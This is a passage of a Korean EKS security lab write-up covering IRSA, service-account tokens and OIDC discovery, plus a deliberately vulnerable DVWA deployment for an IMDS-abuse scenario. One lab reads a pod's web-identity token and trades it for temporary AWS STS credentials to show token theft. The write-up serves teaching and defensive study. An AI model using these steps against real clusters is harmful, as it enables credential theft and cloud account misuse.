+</span></span><span style="display:flex;"><span>kubectl delete pod test-projected-volume <span style="color:#f92672">&amp;&amp;</span> kubectl delete secret user pass
+</span></span></code></pre></div><p><img src="./images/projected-Volume.png" alt="projected Volume"></p>
+<h3 id="4-2-irsa-실습">4-2. IRSA 실습</h3>
+<ul>
+<li>
+<p>개념</p>
+<ul>
+<li>MutatingWebhook: 사용자가 요청한 request에 대해 관리자가 임의로 값을 변경
+<ul>
+<li><code>kubectl get validatingwebhookconfigurations</code></li>
+</ul>
+</li>
+<li>ValidatingWebhook: 사용자가 요청한 request에 대해 관리자가 허용 차단
+<ul>
+<li><code>kubectl get mutatingwebhookconfigurations</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>실습1. CloudTrail 이벤트 ListBucket을 통한, Access Denied 확인</p>
+<ul>
+<li>아래 실행 후, CloudTrail 이벤트 확인 <a href="https://ap-northeast-2.console.aws.amazon.com/cloudtrail/home?region=ap-northeast-2#/events?EventName=ListBuckets">AWS 링크</a></li>
+<li><code>userIdentity</code></li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 파드1 생성</span>
+</span></span><span style="display:flex;"><span>cat <span style="color:#e6db74">&lt;&lt;EOF | kubectl apply -f -
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">apiVersion: v1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kind: Pod
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">metadata:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: eks-iam-test1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">spec:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  containers:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    - name: my-aws-cli
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      image: amazon/aws-cli:latest
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      args: [&#39;s3&#39;, &#39;ls&#39;]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  restartPolicy: Never
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  automountServiceAccountToken: false
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 확인</span>
+</span></span><span style="display:flex;"><span>kubectl get pod
+</span></span><span style="display:flex;"><span>kubectl describe pod
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 로그 확인</span>
+</span></span><span style="display:flex;"><span>kubectl logs eks-iam-test1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 파드1 삭제</span>
+</span></span><span style="display:flex;"><span>kubectl delete pod eks-iam-test1
+</span></span></code></pre></div><p><img src="./images/irsa-failure.png" alt="failure cause of IRSA"></p>
+<p><img src="./images/irsa-access-denied.png" alt="AccessDenied in ListBucket"></p>
+<ul>
+<li>실습2. k8s SA &amp; JWT token
+<ul>
+<li>SA 생성 시, k8s secret에 JWT token이 자동 생성</li>
+<li>EKS IdP(OpentID Connect Provider) 주소: k8s가 발급한 Token 유효 검증</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 파드2 생성</span>
+</span></span><span style="display:flex;"><span>cat <span style="color:#e6db74">&lt;&lt;EOF | kubectl apply -f -
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">apiVersion: v1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kind: Pod
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">metadata:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: eks-iam-test2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">spec:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  containers:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    - name: my-aws-cli
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      image: amazon/aws-cli:latest
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      command: [&#39;sleep&#39;, &#39;36000&#39;]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  restartPolicy: Never
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>kubectl get pod
+</span></span><span style="display:flex;"><span>kubectl describe pod
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># aws 서비스 사용 시도</span>
+</span></span><span style="display:flex;"><span>kubectl exec -it eks-iam-test2 -- aws s3 ls
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 서비스 어카운트 토큰 </span>
+</span></span><span style="display:flex;"><span>SA_TOKEN<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>kubectl exec -it eks-iam-test2 -- cat /var/run/secrets/kubernetes.io/serviceaccount/token<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>echo $SA_TOKEN
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># jwt 혹은 JWT 웹 사이트 이용</span>
+</span></span><span style="display:flex;"><span>jwt decode $SA_TOKEN --json --iso8601
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 파드2 삭제</span>
+</span></span><span style="display:flex;"><span>kubectl delete pod eks-iam-test2
+</span></span></code></pre></div><p><img src="./images/eks-idp.png" alt="EKS IdP address - iss"></p>
+<ul>
+<li>실습3. amazon-eks-pod-identity-webhook을 통한 파드 IAM access 주입(mutating pods)
+<ul>
+<li>아래의 예제에서는 EKS 상의 <strong>LB Controller</strong>가 AWS 서비스에 접근하여 LB를 제어
+<ul>
+<li>따라서 LB Controller가 이용하는 SA에도 관련 IAM Role을 주입</li>
+</ul>
+</li>
+<li>LB Controller는 kube-system Namespace에서 동작 &amp; LB Controller SA 이용</li>
+<li>Webhook이 LB Controller Pod spec에 정보를 주입, 변경(mutating)</li>
+<li>해당 Trust Relationship에서는 인증방법(<code>sts:AssumeRoleWithWebIdentity</code>)이 기재
+<ul>
+<li>JWT Token 내 포함되야하는 Claim 조건1: <code>aud</code>는 <code>sts.amazonaws.com</code></li>
+<li>JWT Token 내 포함되야하는 Claim 조건2: <code>sub</code>는 <code>system:serviceaccount:kube-system:aws-load-balancer-controller</code></li>
+</ul>
+</li>
+<li>OIDC Discovery end-point?
+<ul>
+<li>OpenID Connect Discovery RFC is the specification that defines the structure and content of the OIDC .well-known end-point. <a href="https://directory.openbanking.org.uk/obieservicedesk/s/article/OIDC-Discovery">OPEN BANKING</a></li>
+</ul>
+</li>
+<li>참고: <a href="https://ssup2.github.io/theory_analysis/AWS_EKS_Service_Account_IAM_Role/">Ssup2 Blog</a></li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># eksctl create iamserviceaccount: SA &amp; IAM role &amp; trust policy 동시 생성</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># CloudFormation Stack -&gt; IAM Role 확인 가능</span>
+</span></span><span style="display:flex;"><span>eksctl create iamserviceaccount <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --name my-sa <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --namespace default <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --cluster $CLUSTER_NAME <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --approve <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --attach-policy-arn <span style="color:#66d9ef">$(</span>aws iam list-policies --query <span style="color:#e6db74">&#39;Policies[?PolicyName==`AmazonS3ReadOnlyAccess`].Arn&#39;</span> --output text<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># aws-load-balancer-controller IRSA의 동작 수행을 예상해야 함</span>
+</span></span><span style="display:flex;"><span>eksctl get iamserviceaccount --cluster $CLUSTER_NAME
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>kubectl get sa
+</span></span><span style="display:flex;"><span>kubectl describe sa my-sa
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## SA를 기반으로한 신규 파드 생성</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 파드3번 생성</span>
+</span></span><span style="display:flex;"><span>cat <span style="color:#e6db74">&lt;&lt;EOF | kubectl apply -f -
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">apiVersion: v1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kind: Pod
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">metadata:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: eks-iam-test3
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">spec:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  serviceAccountName: my-sa
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  containers:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    - name: my-aws-cli
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      image: amazon/aws-cli:latest
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      command: [&#39;sleep&#39;, &#39;36000&#39;]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  restartPolicy: Never
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 해당 SA를 파드가 사용 시 mutatingwebhook으로 Env,Volume 추가함</span>
+</span></span><span style="display:flex;"><span>kubectl get mutatingwebhookconfigurations pod-identity-webhook -o yaml | kubectl neat | yh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## 파드 생성 yaml에 새로운 내용 추가 확인</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Pod Identity Webhook은 mutating webhook을 통해 Environment 및 1개의 Projected 볼륨 추가</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Environment.{AWS_ROLE_ARN | AWS_WEB_IDENTITY_TOKEN_FILE}</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Volume.aws-iam-token</span>
+</span></span><span style="display:flex;"><span>kubectl get pod eks-iam-test3
+</span></span><span style="display:flex;"><span>kubectl describe pod eks-iam-test3
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## 파드에서 aws-cli 사용</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 몇 가지는 구동이 안되었는데, 아직 이해가 부족하여 추후에 다시 확인 필요 (To-Do)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># VPC의 경우, 권한이 없어서 안되는 것으로 추측</span>
+</span></span><span style="display:flex;"><span>eksctl get iamserviceaccount --cluster $CLUSTER_NAME
+</span></span><span style="display:flex;"><span>kubectl exec -it eks-iam-test3 -- aws sts get-caller-identity --query Arn<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>kubectl exec -it eks-iam-test3 -- aws s3 ls
+</span></span><span style="display:flex;"><span>kubectl exec -it eks-iam-test3 -- aws ec2 describe-instances --region ap-northeast-2
+</span></span><span style="display:flex;"><span>kubectl exec -it eks-iam-test3 -- aws ec2 describe-vpcs --region ap-northeast-2
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 파드에 볼륨 마운트 2개 확인: aws-iam-token</span>
+</span></span><span style="display:flex;"><span>kubectl get pod eks-iam-test3 -o json | jq -r <span style="color:#e6db74">&#39;.spec.containers | .[].volumeMounts&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># aws-iam-token 볼륨 정보 확인 : JWT 토큰이 담겨져있고, exp, aud 속성이 추가되어 있음</span>
+</span></span><span style="display:flex;"><span>kubectl get pod eks-iam-test3 -o json | jq -r <span style="color:#e6db74">&#39;.spec.volumes[] | select(.name==&#34;aws-iam-token&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># API 리소스: mutatingwebhookconfigurations, validatingwebhookconfigurations</span>
+</span></span><span style="display:flex;"><span>kubectl api-resources |grep hook
+</span></span><span style="display:flex;"><span>kubectl get MutatingWebhookConfiguration
+</span></span><span style="display:flex;"><span>kubectl describe MutatingWebhookConfiguration pod-identity-webhook 
+</span></span><span style="display:flex;"><span>kubectl get MutatingWebhookConfiguration pod-identity-webhook -o yaml | yh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># AWS_WEB_IDENTITY_TOKEN_FILE 확인</span>
+</span></span><span style="display:flex;"><span>IAM_TOKEN<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>kubectl exec -it eks-iam-test3 -- cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>echo $IAM_TOKEN
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Discovery Endpoint 접근</span>
+</span></span><span style="display:flex;"><span>IDP<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>aws eks describe-cluster --name myeks --query cluster.identity.oidc.issuer --output text<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>curl -s $IDP/.well-known/openid-configuration | jq -r <span style="color:#e6db74">&#39;.&#39;</span>
+</span></span><span style="display:flex;"><span>curl -s $IDP/keys | jq -r <span style="color:#e6db74">&#39;.&#39;</span> <span style="color:#75715e"># 공개키가 포함된 JWKS 필드</span>
+</span></span></code></pre></div><p><img src="./images/trust-relationships-with-oidc-provider.png" alt="Trust Relationships with oidc-provider"></p>
+<p><img src="./images/pod-with-env-and-volume.png" alt="Pod with Environment &amp; projected Volume"></p>
+<p><img src="./images/check-2-volumemounts-and-aws-iam-token.png" alt="check 2 volumeMounts &amp; aws-iam-token"></p>
+<p><img src="./images/configurated-mutating-and-validating-webhook.png" alt="configurated Mutaing and Validating Webhook"></p>
+<p><img src="./images/discovery-endpoint-with-oidp.png" alt="Discovery endpoint with OIDP"></p>
+<ul>
+<li>실습 4. IRSA를 가장 취약하게 사용하는 방법
+<ul>
+<li>정보 탈취 시 키/토큰 발급 악용 가능.
+<ul>
+<li>라이브 서비스로는 시도 금물</li>
+</ul>
+</li>
+<li>위의 실습 3에 바로 이어서 진행</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># AWS_WEB_IDENTITY_TOKEN_FILE 토큰 값 변수 지정</span>
+</span></span><span style="display:flex;"><span>IAM_TOKEN<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>kubectl exec -it eks-iam-test3 -- cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>echo $IAM_TOKEN
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ROLE ARN 확인 후 변수 직접 지정</span>
+</span></span><span style="display:flex;"><span>eksctl get iamserviceaccount --cluster $CLUSTER_NAME
+</span></span><span style="display:flex;"><span>ROLE_ARN<span style="color:#f92672">=</span>arn:aws:iam::911283464785:role/eksctl-myeks-addon-iamserviceaccount-default-Role1-<span style="color:#f92672">{</span>arn<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># assume-role-with-web-identity STS 임시자격증명 발급 요청</span>
+</span></span><span style="display:flex;"><span>aws sts assume-role-with-web-identity --role-arn $ROLE_ARN --role-session-name mykey --web-identity-token $IAM_TOKEN | jq
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 파드 삭제</span>
+</span></span><span style="display:flex;"><span>kubectl delete pod eks-iam-test3
+</span></span></code></pre></div><h2 id="5-owaps-k8s-top-10">5. OWAPS k8s Top 10</h2>
+<ul>
+<li>실습에서는 세 가지 시나리오로 k8s 보안위협 체감을 목표로 진행</li>
+<li>마지막 5-3 실습의 경우 기존 kubeconfig를 삭제하기 때문에<br>
+cloudformation stack 삭제 시, 수동 작업 필요할 수 있음</li>
+</ul>
+<h3 id="5-1-실습1-eks-pod가-imds-api를-악용하는-시나리오">5-1. 실습1: EKS pod가 IMDS API를 악용하는 시나리오</h3>
+<ul>
+<li>DVWA 활용: mysql, dvwa, ingress
+<ul>
+<li>배포 후 웹에서 확인까지 대기 시간 소요</li>
+</ul>
+</li>
+</ul>
+<p><img src="./images/dvwa-login-page.png" alt="DVWA login page"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># mysql 배포</span>
+</span></span><span style="display:flex;"><span>cat <span style="color:#e6db74">&lt;&lt;EOT &gt; mysql.yaml
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">apiVersion: v1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kind: Secret
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">metadata:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: dvwa-secrets
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">type: Opaque
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">data:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  # s3r00tpa55
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  ROOT_PASSWORD: czNyMDB0cGE1NQ==
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  # dvwa
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  DVWA_USERNAME: ZHZ3YQ==
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  # p@ssword
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  DVWA_PASSWORD: cEBzc3dvcmQ=
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  # dvwa
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  DVWA_DATABASE: ZHZ3YQ==
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">---
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">apiVersion: v1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kind: Service
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">metadata:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: dvwa-mysql-service
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">spec:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  selector:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    app: dvwa-mysql
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    tier: backend
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  ports:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    - protocol: TCP
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      port: 3306
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      targetPort: 3306
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">---
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">apiVersion: apps/v1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kind: Deployment
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">metadata:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: dvwa-mysql
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">spec:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  replicas: 1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  selector:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    matchLabels:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      app: dvwa-mysql
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      tier: backend
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  template:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    metadata:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      labels:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        app: dvwa-mysql
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        tier: backend
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    spec:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      containers:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        - name: mysql
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          image: mariadb:10.1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          resources:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            requests:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              cpu: &#34;0.3&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              memory: 256Mi
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            limits:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              cpu: &#34;0.3&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              memory: 256Mi
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          ports:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            - containerPort: 3306
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          env:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            - name: MYSQL_ROOT_PASSWORD
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              valueFrom:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                secretKeyRef:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  name: dvwa-secrets
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  key: ROOT_PASSWORD
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            - name: MYSQL_USER
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              valueFrom:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                secretKeyRef:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  name: dvwa-secrets
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  key: DVWA_USERNAME
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            - name: MYSQL_PASSWORD
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              valueFrom:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                secretKeyRef:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  name: dvwa-secrets
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  key: DVWA_PASSWORD
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            - name: MYSQL_DATABASE
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              valueFrom:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                secretKeyRef:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  name: dvwa-secrets
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  key: DVWA_DATABASE
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOT</span>
+</span></span><span style="display:flex;"><span>kubectl apply -f mysql.yaml
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># DVWA 배포</span>
+</span></span><span style="display:flex;"><span>cat <span style="color:#e6db74">&lt;&lt;EOT &gt; dvwa.yaml
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">apiVersion: v1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kind: ConfigMap
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">metadata:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: dvwa-config
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">data:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  RECAPTCHA_PRIV_KEY: &#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  RECAPTCHA_PUB_KEY: &#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  SECURITY_LEVEL: &#34;low&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  PHPIDS_ENABLED: &#34;0&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  PHPIDS_VERBOSE: &#34;1&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  PHP_DISPLAY_ERRORS: &#34;1&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">---
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">apiVersion: v1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kind: Service
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">metadata:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: dvwa-web-service
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">spec:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  selector:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    app: dvwa-web
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  type: ClusterIP
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  ports:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    - protocol: TCP
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      port: 80
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      targetPort: 80
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">---
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">apiVersion: apps/v1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">kind: Deployment
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">metadata:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  name: dvwa-web
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">spec:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  replicas: 1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  selector:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    matchLabels:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      app: dvwa-web
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  template:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    metadata:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      labels:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        app: dvwa-web
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    spec:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">      containers:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        - name: dvwa
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          image: cytopia/dvwa:php-8.1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          ports:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            - containerPort: 80
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          resources:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            requests:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              cpu: &#34;0.3&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              memory: 256Mi
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            limits:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              cpu: &#34;0.3&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              memory: 256Mi
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">          env:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            - name: RECAPTCHA_PRIV_KEY
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              valueFrom:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                configMapKeyRef:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  name: dvwa-config
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                  key: RECAPTCHA_PRIV_KEY
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            - name: RECAPTCHA_PUB_KEY
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">              valueFrom:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                configMapKeyRef:
